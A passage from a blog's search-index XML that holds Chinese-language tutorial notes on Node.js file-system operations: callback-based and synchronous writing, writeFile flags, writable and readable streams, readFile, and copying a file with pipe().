class="string">&quot;hello2.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="keyword">function</span> (<span class="params">err , fd</span>) &#123;</span><br><span class="line">    <span class="comment">//判断是否出错</span></span><br><span class="line">    <span class="keyword">if</span>(!err)&#123;</span><br><span class="line">        <span class="comment">//如果没有出错，则对文件进行写入操作</span></span><br><span class="line">        fs.<span class="title function_">write</span>(fd,<span class="string">&quot;这是异步写入的内容&quot;</span>,<span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!err)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;写入成功~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//关闭文件</span></span><br><span class="line">            fs.<span class="title function_">close</span>(fd , <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!err)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;文件已关闭~~~&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;程序向下执行~~~&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><p>1、打开文件</p><ul><li>fs.open(path, flags[, mode], callback)</li><li>异步调用的方法，结果都是通过回调函数的参数返回的</li><li>回调函数两个参数：<ul><li>err 错误对象，如果没有错误则为null</li><li>fd  文件的描述符</li></ul></li></ul></li><li><p>2、用来异步写入一个文件</p><ul><li>fs.write(fd, string[, position[, encoding]], callback)</li></ul></li><li><p>3、保存并关闭文件</p><ul><li> fs.close(fd, callback)</li></ul></li></ul><h2 id="简单文件写入"><a href="#简单文件写入" class="headerlink" title="简单文件写入"></a>简单文件写入</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引入fs模块</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&quot;hello3.txt&quot;</span>,<span class="string">&quot;这是通过writeFile写入的内容&quot;</span>,&#123;<span class="attr">flag</span>:<span class="string">&quot;r+&quot;</span>&#125; , <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span>(!err)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;写入成功~~~&quot;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//C:\\Users\\lilichao\\Desktop\\hello.txt 用\转义</span></span><br><span class="line"><span class="comment">//C:/Users/lilichao/Desktop/hello.txt</span></span><br><span class="line">fs.<span class="title function_">writeFile</span>(<span class="string">&quot;C:/Users/lilichao/Desktop/hello.txt&quot;</span>,<span class="string">&quot;这是通过writeFile写入的内容&quot;</span>,&#123;<span class="attr">flag</span>:<span class="string">&quot;w&quot;</span>&#125; , <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span>(!err)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;写入成功~~~&quot;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>异步：fs.writeFile(file, data[, options], callback)</li><li>同步：fs.writeFileSync(file, data[, options])<ul><li>file 要操作的文件的路径</li><li>data 要写入的数据</li><li>options 选项（对象），可以对写入进行一些设置 {flag: ‘w’}</li><li>callback 当写入完成以后执行的函数<ul><li>flag<ul><li>r 只读</li><li>w 可写</li><li>a 追加</li></ul></li></ul></li></ul></li></ul><h2 id="流式文件写入"><a href="#流式文件写入" class="headerlink" title="流式文件写入"></a>流式文件写入</h2><ul><li>(同步、异步、简单文件的写入都不适合大文件的写入，性能较差，容易导致内存溢出)<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"> <span class="keyword">var</span> ws = fs.<span class="title function_">createWriteStream</span>(<span class="string">&quot;hello3.txt&quot;</span>);</span><br><span class="line"> ws.<span class="title function_">once</span>(<span class="string">&quot;open&quot;</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;流打开了~~~&quot;</span>);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> ws.<span class="title function_">once</span>(<span class="string">&quot;close&quot;</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;流关闭了~~~&quot;</span>);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过ws向文件中输出内容</span></span><br><span class="line">ws.<span class="title function_">write</span>(<span class="string">&quot;通过可写流写入文件的内容&quot;</span>);</span><br><span class="line">ws.<span class="title function_">write</span>(<span class="string">&quot;今天天气真不错&quot;</span>);</span><br><span class="line">ws.<span class="title function_">write</span>(<span class="string">&quot;锄禾日当午&quot;</span>);</span><br><span class="line">ws.<span class="title function_">write</span>(<span class="string">&quot;红掌拨清清&quot;</span>);</span><br><span class="line">ws.<span class="title function_">write</span>(<span class="string">&quot;清清真漂亮&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//关闭流</span></span><br><span class="line">ws.<span class="title function_">end</span>();</span><br></pre></td></tr></table></figure></li><li>创建一个可写流：fs.createWriteStream(path[, options])<ul><li>path，文件路径</li><li>options 配置的参数</li></ul></li><li>可以通过监听流的open和close事件来监听流的打开和关闭<ul><li>on(事件字符串,回调函数)<ul><li>可以为对象绑定一个事件</li></ul></li><li>once(事件字符串,回调函数)<ul><li>可以为对象绑定一个一次性的事件，该事件将会在触发一次以后自动失效</li></ul></li></ul></li></ul><h2 id="同步读取和异步读取"><a href="#同步读取和异步读取" class="headerlink" title="同步读取和异步读取"></a>同步读取和异步读取</h2><ul><li><p>打开文件</p><ul><li>fs.open(path, flags[, mode], callback)</li><li>fs.openSync(path, flags[, mode])</li></ul></li><li><p>读写文件</p><ul><li><p>fs.write(fd, string[, position[, encoding]], callback)</p></li><li><p>fs.writeSync(fd, string[, position[, encoding]])</p></li><li><p>fs.read(fd, buffer, offset, length, position, callback)</p></li><li><p>fs.readSync(fd, buffer, offset, length, position)</p></li></ul></li><li><p>关闭文件</p><ul><li>fs.close(fd,callback)</li><li>fs.closeSync(fd);</li></ul></li></ul><h2 id="简单文件读取"><a href="#简单文件读取" class="headerlink" title="简单文件读取"></a>简单文件读取</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="string">&quot;C:/Users/lilichao/Desktop/笔记.mp3&quot;</span>;</span><br><span class="line"></span><br><span class="line">fs.<span class="title function_">readFile</span>(<span class="string">&quot;an.jpg&quot;</span> , <span class="keyword">function</span> (<span class="params">err , data</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!err)&#123;</span><br><span class="line">       <span class="comment">//console.log(data);</span></span><br><span class="line">       <span class="comment">//console.log(data.toString());</span></span><br><span class="line">       <span class="comment">//将data写入到文件中</span></span><br><span class="line">       fs.<span class="title function_">writeFile</span>(<span class="string">&quot;C:/Users/lilichao/Desktop/hello.jpg&quot;</span>,data,<span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(!err)&#123;</span><br><span class="line">              <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;文件写入成功&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>fs.readFile(path[, options], callback)</li><li>fs.readFileSync(path[, options])<ul><li>path 要读取的文件的路径</li><li>options 读取的选项</li><li>callback回调函数，通过回调函数将读取到内容返回(err , data)<ul><li>err 错误对象</li><li>data 读取到的数据，会返回一个Buffer，读出的数据有可能是图片、音频或其他文件</li></ul></li></ul></li></ul><h2 id="流式文件读取"><a href="#流式文件读取" class="headerlink" title="流式文件读取"></a>流式文件读取</h2><ul><li>适用于一些比较大的文件，可以分多次将文件读取到内存中<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个可读流</span></span><br><span class="line"><span class="keyword">var</span> rs = fs.<span class="title function_">createReadStream</span>(<span class="string">&quot;C:/Users/lilichao/Desktop/笔记.mp3&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个可写流</span></span><br><span class="line"><span class="keyword">var</span> ws = fs.<span class="title function_">createWriteStream</span>(<span class="string">&quot;a.mp3&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听流的开启和关闭</span></span><br><span class="line">rs.<span class="title function_">once</span>(<span class="string">&quot;open&quot;</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;可读流打开了~~&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">rs.<span class="title function_">once</span>(<span class="string">&quot;close&quot;</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;可读流关闭了~~&quot;</span>);</span><br><span class="line">   <span class="comment">//数据读取完毕，关闭可写流</span></span><br><span class="line"></span><br><span class="line">   ws.<span class="title function_">end</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">once</span>(<span class="string">&quot;open&quot;</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;可写流打开了~~&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">ws.<span class="title function_">once</span>(<span class="string">&quot;close&quot;</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;可写流关闭了~~&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果要读取一个可读流中的数据，必须要为可读流绑定一个data事件，data事件绑定完毕，它会自动开始读取数据</span></span><br><span class="line">rs.<span class="title function_">on</span>(<span class="string">&quot;data&quot;</span>, <span class="keyword">function</span> (<span class="params">data</span>) &#123;</span><br><span class="line">   <span class="comment">//console.log(data);</span></span><br><span class="line">   <span class="comment">//将读取到的数据写入到可写流中</span></span><br><span class="line">   ws.<span class="title function_">write</span>(data);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//pipe()可以将可读流中的内容，直接输出到可写流中</span></span><br><span class="line">rs.<span class="title function_">pipe</span>(ws);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> node </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
